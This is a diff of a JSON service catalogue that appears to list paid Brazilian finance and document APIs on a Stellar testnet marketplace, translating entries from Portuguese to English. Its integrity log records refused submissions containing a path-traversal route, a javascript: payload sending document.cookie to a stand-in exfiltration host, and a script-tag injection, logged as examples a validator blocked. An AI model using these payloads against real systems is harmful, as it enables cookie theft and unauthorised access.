@@ -1,24 +1,25 @@
 {
-  "generatedAt": 1786041982338,
+  "generatedAt": 1786042123151,
   "network": "stellar:testnet",
   "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+  "assetCode": "SXT",
   "facilitator": "http://localhost:4021",
   "items": [
     {
-      "id": "https://nfe.pregao.dev/v1/parse",
+      "id": "https://nfe.sextant.dev/v1/parse",
       "resource": {
-        "url": "https://nfe.pregao.dev/v1/parse",
-        "serviceName": "Leitor de NF-e / DANFE",
+        "url": "https://nfe.sextant.dev/v1/parse",
+        "serviceName": "NF-e Invoice Reader",
         "tags": [
+          "invoice",
           "nfe",
           "nota-fiscal",
           "ocr",
-          "fiscal",
-          "brasil",
-          "documento"
+          "tax",
+          "brazil"
         ],
-        "iconUrl": "https://nfe.pregao.dev/icon.png",
-        "description": "Extrai XML de NF-e ou PDF de DANFE e devolve JSON estruturado: emitente, destinatário, itens, CFOP, impostos e chave de acesso de 44 dígitos. Treinado em nota fiscal eletrônica brasileira."
+        "iconUrl": "https://nfe.sextant.dev/icon.png",
+        "description": "Reads a Brazilian electronic invoice (NF-e XML or DANFE PDF) and returns structured JSON: issuer, recipient, line items, CFOP codes, taxes and the 44-digit access key. Handles scanned invoices down to 150 dpi."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -37,29 +38,30 @@
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"chave\":\"3524...\",\"emitente\":{\"cnpj\":\"...\"},\"itens\":[...]}"
+        "example": "{\"key\":\"3524...\",\"issuer\":{\"taxId\":\"...\"},\"items\":[...]}"
       },
       "routeTemplate": "/v1/parse",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041862338,
+      "lastSeenAt": 1786042003151,
       "settlements": 412
     },
     {
-      "id": "https://receita.pregao.dev/v1/cnpj/{cnpj}",
+      "id": "https://registry.sextant.dev/v1/company/{taxId}",
       "resource": {
-        "url": "https://receita.pregao.dev/v1/cnpj/{cnpj}",
-        "serviceName": "Enriquecimento cadastral CNPJ",
+        "url": "https://registry.sextant.dev/v1/company/{taxId}",
+        "serviceName": "Company Registry Enrichment",
         "tags": [
+          "company",
+          "registry",
           "cnpj",
-          "receita-federal",
-          "cadastro",
           "kyb",
-          "brasil"
+          "enrichment",
+          "brazil"
         ],
-        "iconUrl": "https://receita.pregao.dev/icon.png",
-        "description": "Consulta situação cadastral, CNAE principal e secundários, quadro societário e endereço a partir de um CNPJ. Cache de 24h sobre a base pública da Receita Federal."
+        "iconUrl": "https://registry.sextant.dev/icon.png",
+        "description": "Resolves a Brazilian CNPJ tax id into registration status, primary and secondary activity codes, ownership structure and registered address. 24 h cache over the federal public registry."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -71,36 +73,37 @@
         "type": "http",
         "method": "GET",
         "queryParams": {
-          "cnpj": "string(14)",
-          "socios": "boolean"
+          "taxId": "string(14)",
+          "owners": "boolean"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"razao_social\":\"...\",\"situacao\":\"ATIVA\",\"cnae\":\"6201-5/01\"}"
+        "example": "{\"legalName\":\"...\",\"status\":\"ACTIVE\",\"activity\":\"6201-5/01\"}"
       },
-      "routeTemplate": "/v1/cnpj/{cnpj}",
+      "routeTemplate": "/v1/company/{taxId}",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041942338,
+      "lastSeenAt": 1786042083151,
       "settlements": 1877
     },
     {
-      "id": "https://pix.pregao.dev/mcp#conciliar_extrato",
+      "id": "https://pix.sextant.dev/mcp#reconcile_statement",
       "resource": {
-        "url": "https://pix.pregao.dev/mcp",
-        "serviceName": "Conciliação de extrato PIX",
+        "url": "https://pix.sextant.dev/mcp",
+        "serviceName": "PIX Statement Reconciler",
         "tags": [
+          "reconciliation",
           "pix",
-          "conciliacao",
-          "financeiro",
+          "payments",
           "mcp",
-          "brasil"
+          "finance",
+          "accounting"
         ],
-        "iconUrl": "https://pix.pregao.dev/icon.png",
-        "description": "Ferramenta MCP que casa lançamentos de extrato PIX com contas a receber por valor, data e chave, devolvendo divergências ranqueadas por confiança."
+        "iconUrl": "https://pix.sextant.dev/icon.png",
+        "description": "MCP tool that matches PIX bank statement lines against open receivables by amount, date and key, returning unmatched entries ranked by confidence."
       },
       "type": "mcp",
       "network": "stellar:testnet",
@@ -110,48 +113,48 @@
       "maxAmountRequired": "45000",
       "input": {
         "type": "mcp",
-        "toolName": "conciliar_extrato",
+        "toolName": "reconcile_statement",
         "inputSchema": {
           "type": "object",
           "properties": {
-            "extrato": {
+            "statement": {
               "type": "array"
             },
-            "receber": {
+            "receivables": {
               "type": "array"
             }
           },
           "required": [
-            "extrato",
-            "receber"
+            "statement",
+            "receivables"
           ]
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"casados\":128,\"divergencias\":[{\"conf\":0.94}]}"
+        "example": "{\"matched\":128,\"unmatched\":[{\"confidence\":0.94}]}"
       },
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041322338,
+      "lastSeenAt": 1786041463151,
       "settlements": 233
     },
     {
-      "id": "https://boleto.pregao.dev/v1/linha-digitavel",
+      "id": "https://slip.sextant.dev/v1/bank-slip",
       "resource": {
-        "url": "https://boleto.pregao.dev/v1/linha-digitavel",
-        "serviceName": "Parser de boleto bancário",
+        "url": "https://slip.sextant.dev/v1/bank-slip",
+        "serviceName": "Bank Slip Parser",
         "tags": [
           "boleto",
+          "bank-slip",
           "febraban",
-          "pagamento",
-          "validacao",
-          "brasil"
+          "payments",
+          "validation"
         ],
-        "iconUrl": "https://boleto.pregao.dev/icon.png",
-        "description": "Decodifica linha digitável ou código de barras FEBRABAN: banco emissor, vencimento, valor, dígitos verificadores e validação de módulo 10/11."
+        "iconUrl": "https://slip.sextant.dev/icon.png",
+        "description": "Decodes a FEBRABAN boleto barcode or typeable line into issuing bank, due date, amount and check digits, with modulo 10/11 validation."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -163,35 +166,36 @@
         "type": "http",
         "method": "POST",
         "body": {
-          "linha": "string(47|48)"
+          "line": "string(47|48)"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"banco\":\"341\",\"vencimento\":\"2026-08-14\",\"valor\":\"1284.50\"}"
+        "example": "{\"bank\":\"341\",\"dueDate\":\"2026-08-14\",\"amount\":\"1284.50\"}"
       },
-      "routeTemplate": "/v1/linha-digitavel",
+      "routeTemplate": "/v1/bank-slip",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041622338,
+      "lastSeenAt": 1786041763151,
       "settlements": 640
     },
     {
-      "id": "https://fala.pregao.dev/v1/transcrever",
+      "id": "https://speech.sextant.dev/v1/transcribe",
       "resource": {
-        "url": "https://fala.pregao.dev/v1/transcrever",
-        "serviceName": "Transcrição pt-BR com diarização",
+        "url": "https://speech.sextant.dev/v1/transcribe",
+        "serviceName": "Portuguese Speech-to-Text",
         "tags": [
           "audio",
-          "transcricao",
+          "transcription",
+          "speech",
           "pt-br",
-          "diarizacao",
-          "ia"
+          "diarization",
+          "ai"
         ],
-        "iconUrl": "https://fala.pregao.dev/icon.png",
-        "description": "Áudio para texto em português brasileiro com separação de locutores, marcação de tempo e vocabulário de call center. Suporta wav, mp3 e ogg."
+        "iconUrl": "https://speech.sextant.dev/icon.png",
+        "description": "Brazilian Portuguese audio to text with speaker diarization, word-level timestamps and a call-centre vocabulary. Accepts wav, mp3 and ogg."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -204,35 +208,36 @@
         "method": "POST",
         "body": {
           "audio": "multipart/form-data",
-          "locutores": "integer"
+          "speakers": "integer"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"duracao_s\":184,\"segmentos\":[{\"locutor\":\"A\",\"t\":0.0,\"texto\":\"...\"}]}"
+        "example": "{\"durationS\":184,\"segments\":[{\"speaker\":\"A\",\"t\":0.0,\"text\":\"...\"}]}"
       },
-      "routeTemplate": "/v1/transcrever",
+      "routeTemplate": "/v1/transcribe",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786040362338,
+      "lastSeenAt": 1786040503151,
       "settlements": 96
     },
     {
-      "id": "https://juridico.pregao.dev/mcp#extrair_clausulas",
+      "id": "https://legal.sextant.dev/mcp#extract_clauses",
       "resource": {
-        "url": "https://juridico.pregao.dev/mcp",
-        "serviceName": "Extrator de cláusulas contratuais",
+        "url": "https://legal.sextant.dev/mcp",
+        "serviceName": "Contract Clause Extractor",
         "tags": [
-          "juridico",
-          "contrato",
-          "clausula",
+          "legal",
+          "contract",
+          "clause",
           "mcp",
-          "nlp"
+          "nlp",
+          "documents"
         ],
-        "iconUrl": "https://juridico.pregao.dev/icon.png",
-        "description": "Ferramenta MCP que localiza cláusulas de rescisão, multa, foro e reajuste em contratos em português e devolve o trecho literal com o offset no documento."
+        "iconUrl": "https://legal.sextant.dev/icon.png",
+        "description": "MCP tool that locates termination, penalty, jurisdiction and price-adjustment clauses in Portuguese and English contracts, returning the literal span and its offset in the document."
       },
       "type": "mcp",
       "network": "stellar:testnet",
@@ -242,46 +247,47 @@
       "maxAmountRequired": "90000",
       "input": {
         "type": "mcp",
-        "toolName": "extrair_clausulas",
+        "toolName": "extract_clauses",
         "inputSchema": {
           "type": "object",
           "properties": {
-            "documento": {
+            "document": {
               "type": "string"
             },
-            "tipos": {
+            "kinds": {
               "type": "array"
             }
           },
           "required": [
-            "documento"
+            "document"
           ]
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"clausulas\":[{\"tipo\":\"rescisao\",\"offset\":8123,\"texto\":\"...\"}]}"
+        "example": "{\"clauses\":[{\"kind\":\"termination\",\"offset\":8123,\"text\":\"...\"}]}"
       },
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786031182338,
+      "lastSeenAt": 1786031323151,
       "settlements": 58
     },
     {
-      "id": "https://geo.pregao.dev/v1/cep/{cep}",
+      "id": "https://geo.sextant.dev/v1/postcode/{code}",
       "resource": {
-        "url": "https://geo.pregao.dev/v1/cep/{cep}",
-        "serviceName": "Geocodificação de CEP",
+        "url": "https://geo.sextant.dev/v1/postcode/{code}",
+        "serviceName": "Postal Code Geocoder",
         "tags": [
-          "cep",
           "geocoding",
-          "endereco",
-          "logistica"
+          "postcode",
+          "cep",
+          "address",
+          "logistics"
         ],
-        "iconUrl": "https://geo.pregao.dev/icon.png",
-        "description": "CEP para logradouro, bairro, município, UF e coordenadas. Cobertura nacional, resposta abaixo de 40 ms."
+        "iconUrl": "https://geo.sextant.dev/icon.png",
+        "description": "Brazilian CEP postal code to street, district, municipality, state and coordinates. National coverage, sub-40 ms response."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -293,35 +299,36 @@
         "type": "http",
         "method": "GET",
         "queryParams": {
-          "cep": "string(8)"
+          "code": "string(8)"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"uf\":\"SP\",\"municipio\":\"São Paulo\",\"lat\":-23.5613,\"lon\":-46.6565}"
+        "example": "{\"state\":\"SP\",\"city\":\"Sao Paulo\",\"lat\":-23.5613,\"lon\":-46.6565}"
       },
-      "routeTemplate": "/v1/cep/{cep}",
+      "routeTemplate": "/v1/postcode/{code}",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041892338,
+      "lastSeenAt": 1786042033151,
       "settlements": 3104
     },
     {
-      "id": "https://cambio.pregao.dev/v1/ptax",
+      "id": "https://fx.sextant.dev/v1/rate",
       "resource": {
-        "url": "https://cambio.pregao.dev/v1/ptax",
-        "serviceName": "Oráculo de câmbio BRL/USD",
+        "url": "https://fx.sextant.dev/v1/rate",
+        "serviceName": "FX Rate Oracle BRL/USD",
         "tags": [
-          "cambio",
+          "fx",
+          "exchange-rate",
           "ptax",
           "brl",
-          "oraculo",
-          "cotacao"
+          "oracle",
+          "quote"
         ],
-        "iconUrl": "https://cambio.pregao.dev/icon.png",
-        "description": "Cotação PTAX e spread de mercado BRL/USD com carimbo de tempo assinado, para agentes que precisam converter preço antes de pagar."
+        "iconUrl": "https://fx.sextant.dev/icon.png",
+        "description": "Reference PTAX rate and live market spread for BRL/USD with a signed timestamp, for agents that must convert a price before they pay."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -333,36 +340,36 @@
         "type": "http",
         "method": "GET",
         "queryParams": {
-          "par": "string",
-          "data": "date"
+          "pair": "string",
+          "date": "date"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"par\":\"BRL/USD\",\"compra\":5.1382,\"venda\":5.1394,\"ts\":1770000000}"
+        "example": "{\"pair\":\"BRL/USD\",\"bid\":5.1382,\"ask\":5.1394,\"ts\":1770000000}"
       },
-      "routeTemplate": "/v1/ptax",
+      "routeTemplate": "/v1/rate",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786041962338,
+      "lastSeenAt": 1786042103151,
       "settlements": 1520
     },
     {
-      "id": "https://sped.pregao.dev/v1/validar",
+      "id": "https://sped.sextant.dev/v1/validate",
       "resource": {
-        "url": "https://sped.pregao.dev/v1/validar",
-        "serviceName": "Validador de arquivo SPED Fiscal",
+        "url": "https://sped.sextant.dev/v1/validate",
+        "serviceName": "Tax Filing Validator",
         "tags": [
+          "tax",
           "sped",
           "efd",
-          "icms",
-          "fiscal",
-          "validacao"
+          "compliance",
+          "validation"
         ],
-        "iconUrl": "https://sped.pregao.dev/icon.png",
-        "description": "Valida blocos e registros de SPED Fiscal EFD ICMS/IPI, apontando linha, registro e regra violada antes da entrega ao fisco."
+        "iconUrl": "https://sped.sextant.dev/icon.png",
+        "description": "Validates SPED EFD ICMS/IPI blocks and records, reporting line, record type and violated rule before the file is filed with the tax authority."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -374,36 +381,36 @@
         "type": "http",
         "method": "POST",
         "body": {
-          "arquivo": "text/plain",
-          "versao": "string"
+          "file": "text/plain",
+          "version": "string"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"erros\":[{\"linha\":9123,\"registro\":\"C170\",\"regra\":\"...\"}]}"
+        "example": "{\"errors\":[{\"line\":9123,\"record\":\"C170\",\"rule\":\"...\"}]}"
       },
-      "routeTemplate": "/v1/validar",
+      "routeTemplate": "/v1/validate",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786013182338,
+      "lastSeenAt": 1786013323151,
       "settlements": 71
     },
     {
-      "id": "https://docs.pregao.dev/v1/ocr",
+      "id": "https://docs.sextant.dev/v1/ocr",
       "resource": {
-        "url": "https://docs.pregao.dev/v1/ocr",
-        "serviceName": "OCR de documento brasileiro (RG/CNH)",
+        "url": "https://docs.sextant.dev/v1/ocr",
+        "serviceName": "Identity Document OCR",
         "tags": [
           "ocr",
-          "documento",
-          "rg",
-          "cnh",
-          "kyc"
+          "identity",
+          "document",
+          "kyc",
+          "vision"
         ],
-        "iconUrl": "https://docs.pregao.dev/icon.png",
-        "description": "Lê RG, CNH e comprovante de residência, devolvendo campos normalizados e um score de adulteração por campo."
+        "iconUrl": "https://docs.sextant.dev/icon.png",
+        "description": "Reads national id cards, driving licences and proof-of-address documents, returning normalized fields plus a per-field tamper score."
       },
       "type": "http",
       "network": "stellar:testnet",
@@ -415,87 +422,87 @@
         "type": "http",
         "method": "POST",
         "body": {
-          "imagem": "multipart/form-data"
+          "image": "multipart/form-data"
         }
       },
       "output": {
         "type": "json",
         "format": "application/json",
-        "example": "{\"tipo\":\"CNH\",\"nome\":\"...\",\"adulteracao\":0.02}"
+        "example": "{\"kind\":\"DRIVING_LICENCE\",\"name\":\"...\",\"tamper\":0.02}"
       },
       "routeTemplate": "/v1/ocr",
       "extensions": [
         "bazaar"
       ],
-      "lastSeenAt": 1786038682338,
+      "lastSeenAt": 1786038823151,
       "settlements": 289
     }
   ],
   "total": 10,
   "integrity": [
     {
-      "at": 1786041802338,
+      "at": 1786041943151,
       "verdict": "rejected",
       "rule": "route-template/traversal",
       "field": "routeTemplate",
       "input": "/v1/parse/{id}/../../admin/keys",
-      "reason": "Segmento \"../\" em route template — escapa do prefixo do recurso anunciado."
+      "reason": "Traversal segment in route template — escapes the advertised resource prefix."
     },
     {
-      "at": 1786041442338,
+      "at": 1786041583151,
       "verdict": "soft-drop",
       "rule": "resource/icon-url-origin",
       "field": "resource.iconUrl",
       "input": "http://198.51.100.7/icon.png",
-      "reason": "iconUrl fora da origem do recurso e sem TLS — campo descartado, registro mantido."
+      "reason": "Icon URL off the resource origin and not TLS — field dropped, record kept."
     },
     {
-      "at": 1786041142338,
+      "at": 1786041283151,
       "verdict": "soft-drop",
       "rule": "resource/tags-cardinality",
       "field": "resource.tags",
-      "input": "[\"nfe\",\"nf\",\"nfe-br\", … 96 more]",
-      "reason": "Excesso de tags (99 > 16). Excedente truncado para conter poluição de índice."
+      "input": "[\"invoice\",\"inv\",\"invoices\", … 96 more]",
+      "reason": "Tag flood (99 > 16). Overflow truncated to contain index pollution."
     },
     {
-      "at": 1786040662338,
+      "at": 1786040803151,
       "verdict": "rejected",
       "rule": "payment/network-mismatch",
       "field": "network",
       "input": "eip155:8453",
-      "reason": "Rede fora do escopo do facilitador. Somente stellar:testnet é indexado."
+      "reason": "Network outside facilitator scope. Only stellar:testnet is indexed."
     },
     {
-      "at": 1786040122338,
+      "at": 1786040263151,
       "verdict": "soft-drop",
       "rule": "resource/description-length",
       "field": "resource.description",
-      "input": "\"melhor api do mundo …\" (18.204 chars)",
-      "reason": "Descrição acima de 2.000 chars — truncada antes da indexação BM25."
+      "input": "\"best api in the world …\" (18,204 chars)",
+      "reason": "Description over 2,000 chars — truncated before BM25 indexing."
     },
     {
-      "at": 1786039102338,
+      "at": 1786039243151,
       "verdict": "rejected",
       "rule": "route-template/scheme-injection",
       "field": "routeTemplate",
       "input": "javascript:fetch(\"//exfil.example/\"+document.cookie)",
-      "reason": "Route template não é um caminho — esquema executável recusado."
+      "reason": "Route template is not a path — executable scheme refused."
     },
     {
-      "at": 1786037722338,
+      "at": 1786037863151,
       "verdict": "rejected",
       "rule": "payment/payto-checksum",
       "field": "payTo",
       "input": "GBADCAFE…INVALID",
-      "reason": "Chave pública Stellar com checksum inválido — anúncio não pagável."
+      "reason": "Stellar public key fails checksum — advertisement is not payable."
     },
     {
-      "at": 1786036282338,
+      "at": 1786036423151,
       "verdict": "soft-drop",
       "rule": "resource/tag-charset",
       "field": "resource.tags",
-      "input": "[\"nota\\u0000fiscal\",\"<script>alert(1)</script>\"]",
-      "reason": "Bytes nulos e markup em tags — normalizados fora do índice."
+      "input": "[\"inv\\u0000oice\",\"<script>alert(1)</script>\"]",
+      "reason": "Null bytes and markup in tags — normalized out of the index."
     }
   ]
 }
